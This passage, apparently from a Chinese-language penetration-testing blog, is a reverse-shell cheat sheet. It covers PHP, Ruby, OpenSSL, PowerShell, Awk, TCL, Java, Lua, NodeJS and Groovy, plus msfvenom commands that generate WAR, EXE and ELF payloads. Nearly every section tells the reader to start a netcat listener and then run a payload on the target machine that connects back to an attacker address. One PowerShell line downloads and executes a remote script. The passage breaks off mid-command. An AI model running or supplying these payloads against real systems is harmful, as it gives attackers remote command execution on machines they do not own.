+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$sock</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);<span class="variable">$proc</span><span class="operator">=</span>proc_open(<span class="string">&quot;/bin/sh -i&quot;</span>, array(<span class="number">0</span><span class="operator">=&gt;</span><span class="variable">$s</span>, <span class="number">1</span><span class="operator">=&gt;</span><span class="variable">$s</span>, <span class="number">2</span><span class="operator">=&gt;</span><span class="variable">$s</span>),<span class="variable">$pipes</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);shell_exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);`<span class="operator">/</span>bin<span class="operator">/</span>sh <span class="operator">-</span>i <span class="operator">&lt;&amp;</span><span class="number">3</span> <span class="operator">&gt;&amp;</span><span class="number">3</span> <span class="number">2</span><span class="operator">&gt;&amp;</span><span class="number">3</span>`;&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);system(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>);popen(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>, <span class="string">&quot;r&quot;</span>);&#x27;</span><br><span class="line">php <span class="operator">-</span>r &#x27;<span class="variable">$s</span><span class="operator">=</span>\&#x27;<span class="number">127.0</span>.<span class="number">0.1</span>\&#x27;;<span class="variable">$p</span><span class="operator">=</span><span class="number">443</span>;<span class="meta">@error_reporting</span>(<span class="number">0</span>);<span class="meta">@ini_set</span>(<span class="string">&quot;error_log&quot;</span>,<span class="type">NULL</span>);<span class="meta">@ini_set</span>(<span class="string">&quot;log_errors&quot;</span>,<span class="number">0</span>);<span class="meta">@set_time_limit</span>(<span class="number">0</span>);umask(<span class="number">0</span>);<span class="keyword">if</span>(<span class="variable">$s</span><span class="operator">=</span>fsockopen(<span class="variable">$s</span>,<span class="variable">$p</span>,<span class="variable">$n</span>,<span class="variable">$n</span>))&#123;<span class="keyword">if</span>(<span class="variable">$x</span><span class="operator">=</span>proc_open(\&#x27;<span class="operator">/</span>bin<span class="operator">/</span>sh<span class="variable">$IFS</span><span class="operator">-</span>i\&#x27;,array(array(\&#x27;pipe\&#x27;,\&#x27;r\&#x27;),array(\&#x27;pipe\&#x27;,\&#x27;w\&#x27;),array(\&#x27;pipe\&#x27;,\&#x27;w\&#x27;)),<span class="variable">$p</span>,getcwd()))&#123;stream_set_blocking(<span class="variable">$p</span>[<span class="number">0</span>],<span class="number">0</span>);stream_set_blocking(<span class="variable">$p</span>[<span class="number">1</span>],<span class="number">0</span>);stream_set_blocking(<span class="variable">$p</span>[<span class="number">2</span>],<span class="number">0</span>);stream_set_blocking(<span class="variable">$s</span>,<span class="number">0</span>);<span class="keyword">while</span>(<span class="literal">true</span>)&#123;<span class="keyword">if</span>(feof(<span class="variable">$s</span>))die(\&#x27;connection<span class="operator">/</span>closed\&#x27;);<span class="keyword">if</span>(feof(<span class="variable">$p</span>[<span class="number">1</span>]))die(\&#x27;shell<span class="operator">/</span>not<span class="operator">/</span>response\&#x27;);<span class="variable">$r</span><span class="operator">=</span>array(<span class="variable">$s</span>,<span class="variable">$p</span>[<span class="number">1</span>],<span class="variable">$p</span>[<span class="number">2</span>]);stream_select(<span class="variable">$r</span>,<span class="variable">$n</span>,<span class="variable">$n</span>,null);<span class="keyword">if</span>(in_array(<span class="variable">$s</span>,<span class="variable">$r</span>))fwrite(<span class="variable">$p</span>[<span class="number">0</span>],fread(<span class="variable">$s</span>,<span class="number">1024</span>));<span class="keyword">if</span>(in_array(<span class="variable">$p</span>[<span class="number">1</span>],<span class="variable">$r</span>))fwrite(<span class="variable">$s</span>,fread(<span class="variable">$p</span>[<span class="number">1</span>],<span class="number">1024</span>));<span class="keyword">if</span>(in_array(<span class="variable">$p</span>[<span class="number">2</span>],<span class="variable">$r</span>))fwrite(<span class="variable">$s</span>,fread(<span class="variable">$p</span>[<span class="number">2</span>],<span class="number">1024</span>));&#125;fclose(<span class="variable">$p</span>[<span class="number">0</span>]);fclose(<span class="variable">$p</span>[<span class="number">1</span>]);fclose(<span class="variable">$p</span>[<span class="number">2</span>]);proc_close(<span class="variable">$x</span>);&#125;<span class="keyword">else</span>&#123;die(<span class="string">&quot;proc_open/disabled&quot;</span>);&#125;&#125;<span class="keyword">else</span>&#123;die(<span class="string">&quot;not/connect&quot;</span>);&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用Ruby脚本反弹shell"><a href="#利用Ruby脚本反弹shell" class="headerlink" title="利用Ruby脚本反弹shell"></a>利用Ruby脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">open</span>(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">443</span>).to_i;exec sprintf(<span class="string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)&#x27;</span><br><span class="line">ruby -rsocket -e &#x27;exit <span class="keyword">if</span> fork;c=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">new</span>(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="string">&quot;443&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);<span class="module-access"><span class="module"><span class="identifier">IO</span>.</span></span>popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="pattern-match">|io|c.print io.read&#125;<span class="keyword">end</span>&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Windows平台如下：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">new</span>(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="string">&quot;443&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);<span class="module-access"><span class="module"><span class="identifier">IO</span>.</span></span>popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="pattern-match">|io|c.print io.read&#125;<span class="keyword">end</span>&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="使用OpenSSL反弹shell"><a href="#使用OpenSSL反弹shell" class="headerlink" title="使用OpenSSL反弹shell"></a>使用OpenSSL反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">openssl</span> req -x<span class="number">509</span> -newkey rsa:<span class="number">4096</span> -keyout key.pem -out cert.pem -days <span class="number">365</span> -nodes</span><br><span class="line"><span class="attribute">openssl</span> s_server -quiet -key key.pem -cert cert.pem -port <span class="number">443</span></span><br><span class="line"><span class="attribute">ncat</span> --ssl -vv -l -p <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo <span class="regexp">/tmp/</span>s; <span class="regexp">/bin/</span>sh -i &lt; <span class="regexp">/tmp/</span>s <span class="number">2</span>&gt;&amp;<span class="number">1</span> | openssl s_client -quiet -connect <span class="number">10.10</span>.<span class="number">10.11</span>:<span class="number">443</span> &gt; <span class="regexp">/tmp/</span>s; rm <span class="regexp">/tmp/</span>s</span><br></pre></td></tr></table></figure>
+
+<h2 id="win平台下使用Powershell反弹shell"><a href="#win平台下使用Powershell反弹shell" class="headerlink" title="win平台下使用Powershell反弹shell"></a>win平台下使用Powershell反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.11&quot;</span>,443);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (pwd).Path + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br><span class="line">powershell -nop -c <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;10.10.10.11&#x27;,443);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#x27;</span>)</span><br><span class="line">或</span><br><span class="line">[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(<span class="string">&#x27;<span class="variable">$c</span>=New-Object Net.Sockets.TCPClient(&quot;174.1.52.162&quot;,6666);<span class="variable">$s</span>=<span class="variable">$c</span>.GetStream();[byte[]]<span class="variable">$bytes</span>=0..65535|%&#123;0&#125;;while((<span class="variable">$i</span>=<span class="variable">$s</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$d</span>=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0,<span class="variable">$i</span>);<span class="variable">$sb</span>=(iex <span class="variable">$d</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sb2</span>=<span class="variable">$sb</span>+&#x27;</span><span class="string">&#x27;PS &#x27;</span><span class="string">&#x27;+(pwd).Path+&#x27;</span><span class="string">&#x27;&gt; &#x27;</span><span class="string">&#x27;;<span class="variable">$sb</span>=([Text.Encoding]::Default).GetBytes(<span class="variable">$sb2</span>);<span class="variable">$s</span>.Write(<span class="variable">$sb</span>,0,<span class="variable">$sb</span>.Length);<span class="variable">$s</span>.Flush()&#125;;<span class="variable">$c</span>.Close()&#x27;</span>))</span><br><span class="line"></span><br><span class="line">powershell -nop -<span class="keyword">enc</span> &#123;reverse <span class="literal">shell</span> <span class="literal">command</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用Awk反弹shell"><a href="#利用Awk反弹shell" class="headerlink" title="利用Awk反弹shell"></a>利用Awk反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;s = <span class="string">&quot;/inet/tcp/0/10.10.10.11/443&quot;</span>; <span class="keyword">while</span>(<span class="number">42</span>) &#123; <span class="keyword">do</span>&#123; <span class="built_in">printf</span> <span class="string">&quot;shell&gt;&quot;</span> |&amp; s; s |&amp; getline c; <span class="keyword">if</span>(c)&#123; <span class="keyword">while</span> ((c |&amp; getline) &gt; <span class="number">0</span>) <span class="built_in">print</span> $<span class="number">0</span> |&amp; s; <span class="built_in">close</span>(c); &#125; &#125; <span class="keyword">while</span>(c != <span class="string">&quot;exit&quot;</span>) <span class="built_in">close</span>(s); &#125;&#125;&#x27; /dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="TCL脚本反弹shell"><a href="#TCL脚本反弹shell" class="headerlink" title="TCL脚本反弹shell"></a>TCL脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;<span class="keyword">set</span> s [<span class="keyword">socket</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.11</span> <span class="number">443</span>];<span class="keyword">while</span> <span class="number">42</span> &#123; <span class="keyword">puts</span> -nonewline <span class="variable">$s</span> <span class="string">&quot;shell&gt;&quot;</span>;<span class="keyword">flush</span> <span class="variable">$s</span>;<span class="keyword">gets</span> <span class="variable">$s</span> c;<span class="keyword">set</span> e <span class="string">&quot;exec $c&quot;</span>;<span class="keyword">if</span> &#123;![<span class="keyword">catch</span> &#123;<span class="keyword">set</span> r [<span class="keyword">eval</span> <span class="variable">$e</span>]&#125; err]&#125; &#123; <span class="keyword">puts</span> <span class="variable">$s</span> <span class="variable">$r</span> &#125;; <span class="keyword">flush</span> <span class="variable">$s</span>; &#125;; <span class="keyword">close</span> <span class="variable">$s</span>;&#x27; | tclsh</span><br></pre></td></tr></table></figure>
+
+<h2 id="Java版本反弹shell"><a href="#Java版本反弹shell" class="headerlink" title="Java版本反弹shell"></a>Java版本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<p>linux平台：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime<span class="selector-class">.getRuntime</span>()</span><br><span class="line"><span class="selector-tag">p</span> = r<span class="selector-class">.exec</span>(<span class="selector-attr">[<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>]</span> as String<span class="selector-attr">[]</span>)</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.waitFor</span>()</span><br></pre></td></tr></table></figure>
+
+<p>windows平台：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> host=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">4444</span>;</span><br><span class="line"><span class="keyword">String</span> cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line"><span class="built_in">Process</span> p=<span class="keyword">new</span> <span class="built_in">ProcessBuilder</span>(cmd).<span class="built_in">redirectErrorStream</span>(<span class="literal">true</span>).<span class="built_in">start</span>();Socket s=<span class="keyword">new</span> <span class="built_in">Socket</span>(host,port);InputStream pi=p.<span class="built_in">getInputStream</span>(),pe=p.<span class="built_in">getErrorStream</span>(), si=s.<span class="built_in">getInputStream</span>();OutputStream po=p.<span class="built_in">getOutputStream</span>(),so=s.<span class="built_in">getOutputStream</span>();<span class="keyword">while</span>(!s.<span class="built_in">isClosed</span>())&#123;<span class="keyword">while</span>(pi.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pi.<span class="built_in">read</span>());<span class="keyword">while</span>(pe.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pe.<span class="built_in">read</span>());<span class="keyword">while</span>(si.<span class="built_in">available</span>()&gt;<span class="number">0</span>)po.<span class="built_in">write</span>(si.<span class="built_in">read</span>());so.<span class="built_in">flush</span>();po.<span class="built_in">flush</span>();Thread.<span class="built_in">sleep</span>(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.<span class="built_in">exitValue</span>();<span class="keyword">break</span>;&#125;<span class="built_in"><span class="keyword">catch</span></span> (Exception e)&#123;&#125;&#125;;p.<span class="built_in">destroy</span>();s.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure>
+
+<p>创建线程：</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Thread</span> <span class="keyword">thread</span> = <span class="literal">new</span> <span class="keyword">Thread</span>()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="literal">void</span> run()&#123;</span><br><span class="line">        <span class="comment">// Reverse shell here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">thread</span>.start();</span><br></pre></td></tr></table></figure>
+
+<h2 id="生成War文件反弹shell"><a href="#生成War文件反弹shell" class="headerlink" title="生成War文件反弹shell"></a>生成War文件反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>使用如下命令生成war文件：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f war &gt; reverse.war</span><br></pre></td></tr></table></figure>
+
+<p>查看war包中shell的jsp文件名</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings <span class="keyword">reverse</span>.war | <span class="keyword">grep</span> jsp</span><br></pre></td></tr></table></figure>
+
+<p>在靶机上部署war包后，访问shell的jsp文件，即可在监听端口获得反弹shell</p>
+<h2 id="使用Lua脚本反弹shell"><a href="#使用Lua脚本反弹shell" class="headerlink" title="使用Lua脚本反弹shell"></a>使用Lua脚本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令： Linux平台：</p>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(<span class="string">&#x27;socket&#x27;</span>);require(<span class="string">&#x27;os&#x27;</span>);t=socket.tcp();t:connect(<span class="string">&#x27;10.10.10.11&#x27;</span>,<span class="string">&#x27;443&#x27;</span>);os.execute(<span class="string">&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;</span>);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Windows及Linux平台：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua5<span class="number">.1</span> -e &#x27;<span class="built_in">local</span> host, port = <span class="string">&quot;10.10.10.11&quot;</span>, <span class="number">443</span> <span class="built_in">local</span> socket = require(<span class="string">&quot;socket&quot;</span>) <span class="built_in">local</span> tcp = socket.tcp() <span class="built_in">local</span> io = require(<span class="string">&quot;io&quot;</span>) tcp:connect(host, port); <span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span> <span class="built_in">local</span> cmd, <span class="built_in">status</span>, partial = tcp:receive() <span class="built_in">local</span> f = io.popen(cmd, <span class="string">&quot;r&quot;</span>) <span class="built_in">local</span> s = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>) f:<span class="built_in">close</span>() tcp:send(s) <span class="keyword">if</span> <span class="built_in">status</span> == <span class="string">&quot;closed&quot;</span> <span class="keyword">then</span> <span class="built_in">break</span> end end tcp:<span class="built_in">close</span>()&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="NodeJS版本反弹shell"><a href="#NodeJS版本反弹shell" class="headerlink" title="NodeJS版本反弹shell"></a>NodeJS版本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">443</span>, <span class="string">&quot;10.10.10.11&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>; </span><br><span class="line">&#125;)();</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc -e /bin/sh 10.10.10.11 443&#x27;</span>)</span><br><span class="line">-<span class="keyword">var</span> x = <span class="built_in">global</span>.process.mainModule.require</span><br><span class="line">-x(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc 10.10.10.11 443 -e /bin/bash&#x27;</span>)</span><br><span class="line"><span class="attr">https</span>:<span class="comment">//gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Groovy版本反弹shell"><a href="#Groovy版本反弹shell" class="headerlink" title="Groovy版本反弹shell"></a>Groovy版本反弹shell</h2><p>首先在本地监听TCP协议443端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">443</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上执行如下命令：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> host=<span class="string">&quot;10.10.10.11&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">443</span>;</span><br><span class="line"><span class="keyword">String</span> cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line"><span class="built_in">Process</span> p=<span class="keyword">new</span> <span class="built_in">ProcessBuilder</span>(cmd).<span class="built_in">redirectErrorStream</span>(<span class="literal">true</span>).<span class="built_in">start</span>();Socket s=<span class="keyword">new</span> <span class="built_in">Socket</span>(host,port);InputStream pi=p.<span class="built_in">getInputStream</span>(),pe=p.<span class="built_in">getErrorStream</span>(), si=s.<span class="built_in">getInputStream</span>();OutputStream po=p.<span class="built_in">getOutputStream</span>(),so=s.<span class="built_in">getOutputStream</span>();<span class="keyword">while</span>(!s.<span class="built_in">isClosed</span>())&#123;<span class="keyword">while</span>(pi.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pi.<span class="built_in">read</span>());<span class="keyword">while</span>(pe.<span class="built_in">available</span>()&gt;<span class="number">0</span>)so.<span class="built_in">write</span>(pe.<span class="built_in">read</span>());<span class="keyword">while</span>(si.<span class="built_in">available</span>()&gt;<span class="number">0</span>)po.<span class="built_in">write</span>(si.<span class="built_in">read</span>());so.<span class="built_in">flush</span>();po.<span class="built_in">flush</span>();Thread.<span class="built_in">sleep</span>(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.<span class="built_in">exitValue</span>();<span class="keyword">break</span>;&#125;<span class="built_in"><span class="keyword">catch</span></span> (Exception e)&#123;&#125;&#125;;p.<span class="built_in">destroy</span>();s.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure>
+
+<h2 id="生成Meterpreter反弹Shell"><a href="#生成Meterpreter反弹Shell" class="headerlink" title="生成Meterpreter反弹Shell:"></a>生成Meterpreter反弹Shell:</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f exe &gt; reverse.exe</span><br><span class="line">msfvenom -p windows/shell_reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f exe &gt; reverse.exe</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f elf &gt;reverse.elf</span><br><span class="line">msfvenom -p linux/x86/shell_reverse_tcp <span class="attribute">LHOST</span>=10.10.10.11 <span class="attribute">LPORT</span>=443 -f elf &gt;reverse.elf</span><br><span class="line">msfvenom -p 